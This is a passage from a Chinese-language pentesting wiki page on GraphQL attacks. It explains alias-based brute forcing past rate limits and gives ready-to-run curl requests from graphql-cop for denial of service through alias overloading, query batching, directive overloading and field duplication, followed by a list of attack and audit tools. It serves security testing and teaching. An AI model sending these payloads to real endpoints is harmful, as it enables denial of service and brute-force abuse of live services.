<p>要详细了解 GraphQL 别名，推荐以下资源：<a href="https://portswigger.net/web-security/graphql/what-is-graphql#aliases">Aliases</a>。</p>
<p>虽然别名的主要目的是减少大量 API 调用的必要性，但已识别出一个意外的用例，其中别名可以被利用来对 GraphQL 端点执行暴力攻击。这是可能的，因为某些端点受到速率限制器的保护，旨在通过限制<strong>HTTP 请求的数量</strong>来阻止暴力攻击。然而，这些速率限制器可能没有考虑到每个请求中的操作数量。鉴于别名允许在单个 HTTP 请求中包含多个查询，因此可以规避此类速率限制措施。</p>
<p>考虑下面提供的示例，它说明了如何使用别名查询来验证商店折扣代码的有效性。这种方法可以绕过速率限制，因为它将多个查询编译成一个 HTTP 请求，可能允许同时验证多个折扣代码。</p>
<pre><code class="language-bash"># Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
</code></pre>
<h2 id="dos-in-graphql"><a class="header" href="#dos-in-graphql">DoS in GraphQL</a></h2>
<h3 id="alias-overloading"><a class="header" href="#alias-overloading">Alias Overloading</a></h3>
<p><strong>Alias Overloading</strong> 是一种 GraphQL 漏洞，攻击者通过为同一字段过载查询，使用多个别名，导致后端解析器重复执行该字段。这可能会使服务器资源过载，从而导致 <strong>Denial of Service (DoS)</strong>。例如，在下面的查询中，同一字段（<code>expensiveField</code>）使用别名请求了 1,000 次，迫使后端计算 1,000 次，可能耗尽 CPU 或内存：</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-graphql"># Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "Content-Type: application/json" \
-d '{"query": "{ alias0:__typename \nalias1:__typename \nalias2:__typename \nalias3:__typename \nalias4:__typename \nalias5:__typename \nalias6:__typename \nalias7:__typename \nalias8:__typename \nalias9:__typename \nalias10:__typename \nalias11:__typename \nalias12:__typename \nalias13:__typename \nalias14:__typename \nalias15:__typename \nalias16:__typename \nalias17:__typename \nalias18:__typename \nalias19:__typename \nalias20:__typename \nalias21:__typename \nalias22:__typename \nalias23:__typename \nalias24:__typename \nalias25:__typename \nalias26:__typename \nalias27:__typename \nalias28:__typename \nalias29:__typename \nalias30:__typename \nalias31:__typename \nalias32:__typename \nalias33:__typename \nalias34:__typename \nalias35:__typename \nalias36:__typename \nalias37:__typename \nalias38:__typename \nalias39:__typename \nalias40:__typename \nalias41:__typename \nalias42:__typename \nalias43:__typename \nalias44:__typename \nalias45:__typename \nalias46:__typename \nalias47:__typename \nalias48:__typename \nalias49:__typename \nalias50:__typename \nalias51:__typename \nalias52:__typename \nalias53:__typename \nalias54:__typename \nalias55:__typename \nalias56:__typename \nalias57:__typename \nalias58:__typename \nalias59:__typename \nalias60:__typename \nalias61:__typename \nalias62:__typename \nalias63:__typename \nalias64:__typename \nalias65:__typename \nalias66:__typename \nalias67:__typename \nalias68:__typename \nalias69:__typename \nalias70:__typename \nalias71:__typename \nalias72:__typename \nalias73:__typename \nalias74:__typename \nalias75:__typename \nalias76:__typename \nalias77:__typename \nalias78:__typename \nalias79:__typename \nalias80:__typename \nalias81:__typename \nalias82:__typename \nalias83:__typename \nalias84:__typename \nalias85:__typename \nalias86:__typename \nalias87:__typename \nalias88:__typename \nalias89:__typename \nalias90:__typename \nalias91:__typename \nalias92:__typename \nalias93:__typename \nalias94:__typename \nalias95:__typename \nalias96:__typename \nalias97:__typename \nalias98:__typename \nalias99:__typename \nalias100:__typename \n }"}' \
'https://example.com/graphql'
</code></pre>
<p>{% endcode %}</p>
<p>为了解决这个问题，实施别名计数限制、查询复杂性分析或速率限制，以防止资源滥用。</p>
<h3 id="基于数组的查询批处理"><a class="header" href="#基于数组的查询批处理"><strong>基于数组的查询批处理</strong></a></h3>
<p><strong>基于数组的查询批处理</strong>是一种漏洞，其中GraphQL API允许在单个请求中批处理多个查询，使攻击者能够同时发送大量查询。这可能会通过并行执行所有批处理查询来压垮后端，消耗过多的资源（CPU、内存、数据库连接），并可能导致<strong>服务拒绝（DoS）</strong>。如果对批处理中的查询数量没有限制，攻击者可以利用这一点来降低服务可用性。</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-graphql"># Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" \
-H "Content-Type: application/json" \
-d '[{"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}]' \
'https://example.com/graphql'
</code></pre>
<p>{% endcode %}</p>
<p>在这个例子中，10个不同的查询被批量处理成一个请求，迫使服务器同时执行所有查询。如果利用更大的批量大小或计算开销大的查询，这可能会使服务器过载。</p>
<h3 id="指令过载漏洞"><a class="header" href="#指令过载漏洞"><strong>指令过载漏洞</strong></a></h3>
<p><strong>指令过载</strong>发生在GraphQL服务器允许带有过多重复指令的查询时。这可能会使服务器的解析器和执行器不堪重负，特别是当服务器反复处理相同的指令逻辑时。如果没有适当的验证或限制，攻击者可以通过构造一个包含大量重复指令的查询来利用这一点，从而触发高计算或内存使用，导致<strong>服务拒绝（DoS）</strong>。</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash"># Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" \
-H "Content-Type: application/json" \
-d '{"query": "query cop { __typename @aa@aa@aa@aa@aa@aa@aa@aa@aa@aa }", "operationName": "cop"}' \
'https://example.com/graphql'
</code></pre>
<p>{% endcode %}</p>
<p>请注意，在前面的示例中，<code>@aa</code> 是一个 <strong>可能未声明</strong> 的自定义指令。通常存在的一个常见指令是 <strong><code>@include</code></strong>：</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">curl -X POST \
-H "Content-Type: application/json" \
-d '{"query": "query cop { __typename @include(if: true) @include(if: true) @include(if: true) @include(if: true) @include(if: true) }", "operationName": "cop"}' \
'https://example.com/graphql'
</code></pre>
<p>{% endcode %}</p>
<p>您还可以发送一个 introspection 查询以发现所有声明的指令：</p>
<pre><code class="language-bash">curl -X POST \
-H "Content-Type: application/json" \
-d '{"query": "{ __schema { directives { name locations args { name type { name kind ofType { name } } } } } }"}' \
'https://example.com/graphql'
</code></pre>
<p>然后<strong>使用一些自定义的</strong>。</p>
<h3 id="字段重复漏洞"><a class="header" href="#字段重复漏洞"><strong>字段重复漏洞</strong></a></h3>
<p><strong>字段重复</strong>是一种漏洞，其中GraphQL服务器允许查询中重复过多的相同字段。这迫使服务器为每个实例冗余地解析该字段，消耗大量资源（CPU、内存和数据库调用）。攻击者可以构造包含数百或数千个重复字段的查询，导致高负载，并可能导致<strong>服务拒绝（DoS）</strong>。</p>
<pre><code class="language-bash"># Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" -H "Content-Type: application/json" \
-d '{"query": "query cop { __typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n} ", "operationName": "cop"}' \
'https://example.com/graphql'
</code></pre>
<h2 id="工具"><a class="header" href="#工具">工具</a></h2>
<h3 id="漏洞扫描器"><a class="header" href="#漏洞扫描器">漏洞扫描器</a></h3>
<ul>
<li><a href="https://github.com/dolevf/graphql-cop">https://github.com/dolevf/graphql-cop</a>: 测试graphql端点的常见错误配置</li>
<li><a href="https://github.com/assetnote/batchql">https://github.com/assetnote/batchql</a>: 专注于执行批量GraphQL查询和变更的GraphQL安全审计脚本。</li>
<li><a href="https://github.com/dolevf/graphw00f">https://github.com/dolevf/graphw00f</a>: 指纹识别正在使用的graphql</li>
<li><a href="https://github.com/gsmith257-cyber/GraphCrawler">https://github.com/gsmith257-cyber/GraphCrawler</a>: 工具包，可用于抓取模式并搜索敏感数据，测试授权，暴力破解模式，并找到到给定类型的路径。</li>
<li><a href="https://blog.doyensec.com/2020/03/26/graphql-scanner.html">https://blog.doyensec.com/2020/03/26/graphql-scanner.html</a>: 可作为独立工具或<a href="https://github.com/doyensec/inql">Burp扩展</a>使用。</li>
<li><a href="https://github.com/swisskyrepo/GraphQLmap">https://github.com/swisskyrepo/GraphQLmap</a>: 也可以作为CLI客户端使用以自动化攻击</li>
<li><a href="https://gitlab.com/dee-see/graphql-path-enum">https://gitlab.com/dee-see/graphql-path-enum</a>: 列出在GraphQL模式中<strong>到达给定类型的不同方式</strong>的工具。</li>
<li><a href="https://github.com/doyensec/GQLSpection">https://github.com/doyensec/GQLSpection</a>: InQL的独立和CLI模式的继任者</li>
<li><a href="https://github.com/doyensec/inql">https://github.com/doyensec/inql</a>: 用于高级GraphQL测试的Burp扩展。_<strong>扫描器</strong><em>是InQL v5.0的核心，您可以分析GraphQL端点或本地自省模式文件。它自动生成所有可能的查询和变更，并将其组织成结构化视图以供分析。</em><strong>攻击者</strong>_组件允许您运行批量GraphQL攻击，这对于规避实现不良的速率限制非常有用。</li>
<li><a href="https://github.com/nikitastupin/clairvoyance">https://github.com/nikitastupin/clairvoyance</a>: 尝试通过使用一些Graphql数据库的帮助，即使在禁用自省的情况下也获取模式，这些数据库将建议变更和参数的名称。</li>
</ul>
<h3 id="客户端"><a class="header" href="#客户端">客户端</a></h3>
<ul>
<li><a href="https://github.com/graphql/graphiql">https://github.com/graphql/graphiql</a>: GUI客户端</li>
<li><a href="https://altair.sirmuel.design/">https://altair.sirmuel.design/</a>: GUI客户端</li>
</ul>
<h3 id="自动测试"><a class="header" href="#自动测试">自动测试</a></h3>
<p>{% embed url="https://graphql-dashboard.herokuapp.com/" %}</p>
<ul>
<li>解释AutoGraphQL的视频: <a href="https://www.youtube.com/watch?v=JJmufWfVvyU">https://www.youtube.com/watch?v=JJmufWfVvyU</a></li>
</ul>
<h2 id="参考"><a class="header" href="#参考">参考</a></h2>
<ul>
<li><a href="https://jondow.eu/practical-graphql-attack-vectors/"><strong>https://jondow.eu/practical-graphql-attack-vectors/</strong></a></li>
<li><a href="https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696"><strong>https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696</strong></a></li>
<li><a href="https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4"><strong>https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4</strong></a></li>
<li><a href="http://ghostlulz.com/api-hacking-graphql/"><strong>http://ghostlulz.com/api-hacking-graphql/</strong></a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md"><strong>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md</strong></a></li>
<li><a href="https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696"><strong>https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696</strong></a></li>
<li><a href="https://portswigger.net/web-security/graphql"><strong>https://portswigger.net/web-security/graphql</strong></a></li>
</ul>
<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
<p>深化您在<strong>移动安全</strong>方面的专业知识，参加8kSec学院。通过我们的自学课程掌握iOS和Android安全并获得认证：</p>
<p>{% embed url="https://academy.8ksec.io/" %}</p>
<p>{% hint style="success" %}
学习和实践AWS黑客攻击：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks培训AWS红队专家(ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践GCP黑客攻击：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks培训GCP红队专家(GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持HackTricks</summary>
<ul>
<li>查看<a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord小组</strong></a>或<a href="https://t.me/peass"><strong>电报小组</strong></a>或<strong>在</strong> <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>上关注我们。</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a>和<a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github库提交PR分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../network-services-pentesting/pentesting-web/grafana.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../network-services-pentesting/pentesting-web/h2-java-sql-database.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../network-services-pentesting/pentesting-web/grafana.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../network-services-pentesting/pentesting-web/h2-java-sql-database.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
